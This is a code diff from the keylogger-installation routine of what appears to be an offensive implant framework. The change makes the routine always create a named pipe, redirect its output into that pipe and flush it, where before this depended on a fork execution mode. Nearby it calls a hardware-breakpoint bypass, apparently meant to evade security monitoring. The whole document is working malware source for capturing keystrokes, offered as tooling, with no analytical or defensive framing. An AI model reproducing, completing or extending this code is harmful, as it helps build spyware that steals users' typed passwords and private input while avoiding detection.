@@ -12,31 +12,29 @@ auto DECLFN KeyloggerInstall(
         return HResult;
     };
 
-    if ( Instance->Ctx.ExecMethod == KH_METHOD_FORK ) {
-        SECURITY_ATTRIBUTES SecAttr = { 
-            .nLength = sizeof(SECURITY_ATTRIBUTES), 
-            .lpSecurityDescriptor = nullptr,
-            .bInheritHandle = TRUE
-        };
-
-        Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA(
-            Instance->Pipe.Name, PIPE_ACCESS_DUPLEX,
-            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
-            1, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, &SecAttr
-        );
-
-        if ( Instance->Pipe.Write == INVALID_HANDLE_VALUE ) {
-            DWORD err = NtCurrentTeb()->LastErrorValue;
-            return KeyloggerCleanup();
-        }
-
-        if ( ! Instance->Win32.ConnectNamedPipe( Instance->Pipe.Write, nullptr ) && NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED) {
-            DWORD err = NtCurrentTeb()->LastErrorValue;
-            return KeyloggerCleanup();
-        }
-
-        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
+    SECURITY_ATTRIBUTES SecAttr = { 
+        .nLength = sizeof(SECURITY_ATTRIBUTES), 
+        .lpSecurityDescriptor = nullptr,
+        .bInheritHandle = TRUE
+    };
+    
+    Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA(
+        Instance->Pipe.Name, PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+        1, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, &SecAttr
+    );
+    
+    if ( Instance->Pipe.Write == INVALID_HANDLE_VALUE ) {
+        DWORD err = NtCurrentTeb()->LastErrorValue;
+        return KeyloggerCleanup();
     }
+    
+    if ( ! Instance->Win32.ConnectNamedPipe( Instance->Pipe.Write, nullptr ) && NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED) {
+        DWORD err = NtCurrentTeb()->LastErrorValue;
+        return KeyloggerCleanup();
+    }
+
+    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
 
     if ( Instance->Ctx.Bypass ) {
         Hwbp::KeyloggerInit( Instance->Ctx.Bypass );
@@ -87,14 +85,7 @@ auto DECLFN KeyloggerInstall(
         Hwbp::KeyloggerExit();
     }
 
-    if ( Instance->Ctx.ExecMethod == KH_METHOD_FORK ) {
-        if ( FAILED( HResult ) ) {
-            Instance->Win32.WriteFile( Instance->Pipe.Write, &HResult, sizeof( HResult ), nullptr, 0 );
-        }
-
-        Instance->Win32.FlushFileBuffers( Instance->Pipe.Write );
-    }
-
+    Instance->Win32.FlushFileBuffers( Instance->Pipe.Write );
     return KeyloggerCleanup();
 }
 
